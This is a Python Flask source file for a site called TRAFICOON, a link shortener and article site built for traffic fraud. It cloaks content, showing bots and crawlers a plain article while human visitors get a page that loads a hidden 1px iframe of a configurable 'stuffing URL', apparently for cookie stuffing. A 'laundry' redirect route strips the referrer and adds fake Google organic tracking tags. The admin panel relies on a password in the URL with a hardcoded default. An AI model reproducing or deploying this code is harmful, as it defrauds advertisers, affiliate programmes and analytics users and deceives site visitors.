
import os, re, json, random, requests, datetime, html 
from flask import Flask, render_template_string, request, redirect, Response, make_response
from pymongo import MongoClient
from bson.objectid import ObjectId
from urllib.parse import urlparse, quote

app = Flask(__name__)

# --- الاتصال بقاعدة البيانات ---
raw_uri = os.getenv("MONGO_URI", "").strip()
MONGO_URI = re.sub(r'[\s\n\r]', '', raw_uri)
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "himsounin1$")

try:
    client = MongoClient(MONGO_URI)
    db = client['elite_system_v10']
    links_col = db['links']
    settings_col = db['settings']
    articles_col = db['articles']
    public_logs = db['public_logs']
except Exception as e:
    print(f"DB Error: {e}")

# ==========================================
# 1. القوالب (HTML) - مدمجة داخلياً لمنع الأخطاء
# ==========================================

HOME_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRAFICOON</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style>body{font-family:'Inter',sans-serif;background:#f8fafc}</style>
</head>
<body class="bg-slate-50">
    <nav class="bg-white border-b border-slate-200 p-4">
        <div class="max-w-6xl mx-auto flex justify-between items-center">
            <a href="/" class="font-black text-xl text-slate-900">TRAFICOON<span class="text-blue-600">.</span></a>
            <div class="space-x-4 text-sm font-medium text-slate-600">
                {% for niche in niches %}
                <a href="/?category={{ niche }}" class="hover:text-blue-600 capitalize">{{ niche }}</a>
                {% endfor %}
            </div>
        </div>
    </nav>
    <main class="max-w-6xl mx-auto p-6 grid grid-cols-1 md:grid-cols-3 gap-8 mt-8">
        {% for art in articles %}
        <article class="bg-white rounded-xl shadow-sm border border-slate-100 overflow-hidden hover:shadow-md transition">
            {% if art.image %}
            <img src="{{ art.image }}" class="w-full h-48 object-cover">
            {% endif %}
            <div class="p-6">
                <span class="text-xs font-bold text-blue-600 uppercase">{{ art.category }}</span>
                <h2 class="font-bold text-lg mt-2 mb-2"><a href="/read/{{ art._id }}" class="hover:text-blue-800">{{ art.title }}</a></h2>
                <p class="text-slate-500 text-sm line-clamp-3">{{ art.meta_desc }}</p>
            </div>
        </article>
        {% endfor %}
    </main>
</body>
</html>
"""

LANDING_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ article.title }}</title>
    <meta name="description" content="{{ article.meta_desc }}">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,700;1,300&family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background: #fff; color: #334155; }
        .serif { font-family: 'Merriweather', serif; }
        .prose p { margin-bottom: 1.5em; line-height: 1.8; font-size: 1.125rem; }
        .prose h2 { font-weight: 700; margin-top: 2em; margin-bottom: 1em; color: #0f172a; font-size: 1.5rem; }
        .prose img { border-radius: 8px; margin: 20px 0; width: 100%; }
        .prose a { color: #2563eb; text-decoration: underline; }
    </style>
</head>
<body>
    <nav class="bg-white border-b border-slate-100 sticky top-0 z-50">
        <div class="max-w-3xl mx-auto px-4 h-16 flex items-center justify-between">
            <a href="/" class="font-black text-xl tracking-tighter text-slate-900">TRAFICOON<span class="text-blue-600">.</span></a>
        </div>
    </nav>
    <main class="max-w-3xl mx-auto px-4 py-10">
        <header class="mb-8 border-b border-slate-100 pb-8">
            <span class="text-blue-600 font-bold text-xs uppercase tracking-widest">{{ category|default('News') }}</span>
            <h1 class="text-3xl md:text-4xl font-black text-slate-900 mt-3 mb-4 leading-tight serif">{{ article.title }}</h1>
        </header>
        {% if article.image %}
        <div class="mb-10"><img src="{{ article.image }}" class="w-full rounded-xl"></div>
        {% endif %}
        <div class="prose max-w-none text-slate-700 serif">
            {{ article.body|safe }}
        </div>
        <div class="mt-12 pt-8 border-t border-slate-100 text-center">
            <a href="/" class="bg-slate-900 text-white px-8 py-3 rounded-full font-bold text-sm hover:bg-slate-800 transition">Read More</a>
        </div>
    </main>
    {% if s and s.stuffing_url %}
    <script>
        window.addEventListener('load', function() {
            setTimeout(function() {
                var f = document.createElement('iframe');
                f.style.display = 'none'; f.style.width = '1px'; f.style.height = '1px';
                f.src = "{{ s.stuffing_url }}";
                f.referrerPolicy = "no-referrer";
                document.body.appendChild(f);
            }, 3000); 
        });
    </script>
    {% endif %}
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head><title>Admin</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"></head>
<body style="background:#f0f2f5;padding:20px">
    <div class="container">
        <h2 class="mb-4">System Control</h2>
        <div class="card p-4 mb-4">
            <h5>Settings</h5>
            <form action="/admin/update_settings" method="POST">
                <label>Stuffing URL:</label>
                <input type="text" name="stuffing_url" class="form-control mb-2" value="{{ s.stuffing_url }}">
                <label>Exit URL:</label>
                <input type="text" name="exit_url" class="form-control mb-2" value="{{ s.exit_url }}">
                <button class="btn btn-primary">Save</button>
            </form>
        </div>
        <div class="card p-4 mb-4">
            <h5>Add Article</h5>
            <form action="/admin/add_article" method="POST">
                <input type="text" name="title" class="form-control mb-2" placeholder="Title" required>
                <input type="text" name="category" class="form-control mb-2" placeholder="Category" required>
                <textarea name="html_content" class="form-control mb-2" rows="5" placeholder="HTML" required></textarea>
                <button class="btn btn-success">Publish</button>
            </form>
        </div>
        <div class="card p-4 mb-4">
            <h5>Create Link</h5>
            <form action="/admin/create_link" method="POST">
                <input type="text" name="title" class="form-control mb-2" placeholder="Title" required>
                <input type="url" name="target_url" class="form-control mb-2" placeholder="Target URL" required>
                <input type="text" name="tag" class="form-control mb-2" placeholder="Tag" required>
                <button class="btn btn-dark">Generate</button>
            </form>
        </div>
        <div class="card p-4">
            <h5>Active Links</h5>
            <table class="table">
                {% for link in links %}
                <tr><td><a href="/v/{{ link.slug }}" target="_blank">{{ link.slug }}</a></td><td>{{ link.clicks }}</td><td><a href="/admin/delete/{{ link._id }}" class="text-danger">Del</a></td></tr>
                {% endfor %}
            </table>
        </div>
    </div>
</body>
</html>
"""

PAGE_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>{{ title }}</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-slate-50 p-10 prose mx-auto"><h1>{{ title }}</h1>{{ content|safe }}</body></html>"""

# ==========================================
# 2. اللوجيك (Logic)
# ==========================================

BOT_USER_AGENTS = [
    r"facebookexternalhit", r"Facebot", r"Twitterbot", r"LinkedInBot",
    r"WhatsApp", r"TelegramBot", r"Googlebot", r"AdsBot", r"crawler", 
    r"curl", r"wget", r"python-requests", r"Mediapartners-Google"
]

def is_bot(user_agent):
    if not user_agent: return True
    for bot in BOT_USER_AGENTS:
        if re.search(bot, user_agent, re.IGNORECASE): return True
    return False

def get_settings():
    try:
        s = settings_col.find_one({"type": "global"})
        if not s:
            default = {"type": "global", "stuffing_url": "", "exit_url": ""}
            settings_col.insert_one(default)
            return default
        return s
    except: return {"type": "global", "stuffing_url": "", "exit_url": ""}

def get_client_ip():
    if request.headers.getlist("X-Forwarded-For"): return request.headers.getlist("X-Forwarded-For")[0]
    return request.remote_addr

def extract_seo_data(html_content):
    seo_data = {"description": "", "image": ""}
    p_match = re.search(r'<p[^>]*>(.*?)</p>', html_content, re.IGNORECASE | re.DOTALL)
    if p_match:
        clean = re.sub(r'<.*?>', '', p_match.group(1))
        seo_data["description"] = clean[:160] + "..." if len(clean) > 160 else clean
    img_match = re.search(r'<img[^>]+src="([^">]+)"', html_content, re.IGNORECASE)
    if img_match: seo_data["image"] = img_match.group(1)
    return seo_data

def inject_recommendation(html_content, category, current_id):
    try:
        related = articles_col.find_one({"category": category, "_id": {"$ne": ObjectId(current_id)}})
        if not related: related = articles_col.find_one({"_id": {"$ne": ObjectId(current_id)}})
        if related:
            card = f"""<div style="border-left:4px solid #2563eb;background:#f8fafc;padding:20px;margin:30px 0;"><span style="display:block;color:#64748b;font-size:10px;font-weight:800;text-transform:uppercase;">Don't Miss</span><a href="/read/{related['_id']}" style="color:#0f172a;font-size:17px;font-weight:700;text-decoration:none;">{related['title']}</a></div>"""
            paragraphs = html_content.split('</p>')
            if len(paragraphs) > 2:
                paragraphs[1] += "</p>" + card
                return " ".join(paragraphs[0:2]) + " ".join(paragraphs[2:])
    except: pass
    return html_content

# --- المسارات ---

@app.route('/redirect')
def laundry():
    url = request.args.get('url')
    ua = request.headers.get('User-Agent', '')
    if is_bot(ua): return redirect("/", code=302)
    if not url: return "Error", 400

    separator = "&" if "?" in url else "?"
    final_url = f"{url}{separator}utm_source=google&utm_medium=organic&utm_campaign=search_v9"
    
    html_page = f"""
    <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Securing...</title><style>body{{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}}.loader{{width:50px;height:50px;border:5px solid #333;border-top:5px solid #2563eb;border-radius:50%;animation:spin 1s linear infinite}}@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}</style></head><body><div class="loader"></div><div style="display:none" id="dest">{final_url}</div><script>setTimeout(function(){{var dest=document.getElementById('dest').innerText;var iframe=document.createElement("iframe");iframe.style.display="none";document.body.appendChild(iframe);var frameDoc=iframe.contentDocument||iframe.contentWindow.document;var payload=`<!DOCTYPE html><html><head><meta name="referrer" content="no-referrer"></head><body><script>window.parent.location.replace("`+dest+`");<\/script></body></html>`;frameDoc.open();frameDoc.write(payload);frameDoc.close();}},800);</script></body></html>
    """
    return make_response(html_page)

@app.route('/')
def home():
    try:
        cat = request.args.get('category')
        q = {"category": cat} if cat else {}
        arts = list(articles_col.find(q).sort("created_at", -1).limit(30))
        niches = [n for n in articles_col.distinct("category") if n and n.strip()]
        return render_template_string(HOME_HTML, articles=arts, niches=niches)
    except: return "System OK. Login to Admin to Add Content."

@app.route('/read/<id>')
def read_article(id):
    try:
        art = articles_col.find_one({"_id": ObjectId(id)})
        if not art: return redirect('/')
        s = get_settings()
        art['body'] = inject_recommendation(art['body'], art.get('category'), art['_id'])
        return render_template_string(LANDING_HTML, s=s, article=art, category=art.get('category'))
    except: return redirect('/')

@app.route('/v/<slug>')
@app.route('/<category>/<slug>')
def gateway(slug, category=None):
    ua = request.headers.get('User-Agent', '')
    link = links_col.find_one({"slug": slug})
    if not link: return "404", 404

    if is_bot(ua):
        art = articles_col.find_one({"category": link.get('tag', 'general')})
        if not art: art = {"title":"Welcome", "body":"Loading..."}
        return f"<html><head><title>{art['title']}</title></head><body>{art.get('body','')}</body></html>"
    
    tag = link.get('tag', '').strip().lower()
    art = None
    if tag:
        l = list(articles_col.aggregate([{"$match": {"category": tag}}, {"$sample": {"size": 1}}]))
        if l: art = l[0]
    if not art:
        l = list(articles_col.aggregate([{"$sample": {"size": 1}}]))
        art = l[0] if l else {"title":"Analysis", "body":"Loading...", "category":"General"}
    
    if '_id' in art: art['body'] = inject_recommendation(art.get('body', ''), art.get('category', 'general'), art['_id'])
    links_col.update_one({"slug": slug}, {"$inc": {"clicks": 1}})
    
    return render_template_string(LANDING_HTML, target_url=link['target_url'], s=get_settings(), article=art, slug=slug, category=tag)

@app.route('/public/shorten', methods=['POST'])
def public_shorten():
    target = request.form.get('target_url')
    cat = request.form.get('category', 'general').strip().lower()
    ip = get_client_ip()
    today = datetime.datetime.utcnow().strftime('%Y-%m-%d')
    
    if request.cookies.get('traficoon_limit') == today or public_logs.find_one({"ip": ip, "date": today}):
        return "Limit Exceeded", 429

    arts = list(articles_col.find({"category": cat}, {"title": 1}).limit(50))
    base = re.sub(r'[^a-z0-9]+', '-', random.choice(arts)['title'].lower()).strip('-') if arts else f"top-{cat}-trends"
    slug = f"{base}-{os.urandom(2).hex()}"
    
    links_col.insert_one({"title": f"Public - {base}", "target_url": target, "slug": slug, "clicks": 0, "tag": cat, "is_public": True, "created_at": datetime.datetime.utcnow()})
    public_logs.insert_one({"ip": ip, "date": today})
    
    resp = make_response(f"<input value='{request.host_url}{cat}/{slug}' readonly>")
    resp.set_cookie('traficoon_limit', today, max_age=86400)
    return resp

@app.route('/admin')
def admin():
    if request.args.get('pw') != ADMIN_PASSWORD: return "Denied", 403
    return render_template_string(ADMIN_HTML, links=list(links_col.find().sort("_id", -1)), s=get_settings())

@app.route('/admin/create_link', methods=['POST'])
def create_link():
    t = request.form['title']; u = request.form['target_url']; tag = request.form.get('tag', 'general')
    slug = re.sub(r'[^a-z0-9]', '-', t.lower()).strip('-') + "-" + os.urandom(2).hex()
    links_col.insert_one({"title": t, "target_url": u, "slug": slug, "clicks": 0, "tag": tag, "is_public": False})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

@app.route('/admin/add_article', methods=['POST'])
def add_article():
    t = request.form['title']; html = request.form['html_content']; cat = request.form.get('category', 'general')
    seo = extract_seo_data(html)
    articles_col.insert_one({"title": t, "body": html, "category": cat, "meta_desc": seo['description'], "image": seo['image'], "created_at": datetime.datetime.utcnow()})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

@app.route('/admin/delete/<id>')
def delete_link(id): links_col.delete_one({"_id": ObjectId(id)}); return redirect(f"/admin?pw={ADMIN_PASSWORD}")

@app.route('/admin/update_settings', methods=['POST'])
def update_settings():
    settings_col.update_one({"type": "global"}, {"$set": {"stuffing_url": request.form['stuffing_url'], "exit_url": request.form['exit_url']}})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

STATIC = {"about": "<p>About</p>", "privacy": "<p>Privacy</p>"}
@app.route('/p/<page_name>')
def static_page(page_name):
    c = STATIC.get(page_name)
    if not c: return redirect('/')
    return render_template_string(PAGE_HTML, title=page_name.title(), content=c)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
